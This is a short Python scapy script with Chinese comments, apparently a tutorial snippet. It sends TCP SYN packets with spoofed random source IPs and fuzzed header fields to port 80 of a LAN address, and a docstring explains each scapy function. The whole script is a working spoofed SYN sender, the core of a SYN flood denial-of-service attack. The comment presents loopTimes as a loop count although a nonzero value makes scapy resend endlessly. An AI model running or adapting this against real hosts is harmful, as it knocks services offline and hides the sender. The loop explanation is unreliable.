from scapy.all import send, RandIP, IP, fuzz, TCP

source = RandIP()  # 从随机的IP发送SYN请求
dest = "192.168.1.122"  # 指定目标IP地址, 此处为本机IP地址
port = 80  # 指定通信端口
SYN = 0x002  # 0x002是TCP header中SYN Bit的位置
loopTimes = 1  # 指定发送数据包的循环次数

send(IP(src=source, dst=dest) / fuzz(TCP(dport=port, flags=SYN)), loop=loopTimes)
"""
各参数的意义上文已经给出
现在解释各个函数及符号的意义

1. send()
    发送数据包
2. IP()
    构建IP header
3. /
    用于连接两个不同协议的数据包
4. fuzz()
    本意是对TCP数据包进行模糊测试, 此处用来给待发送的数据包内容生成随机值
5. TCP()
    构建TCP header
"""
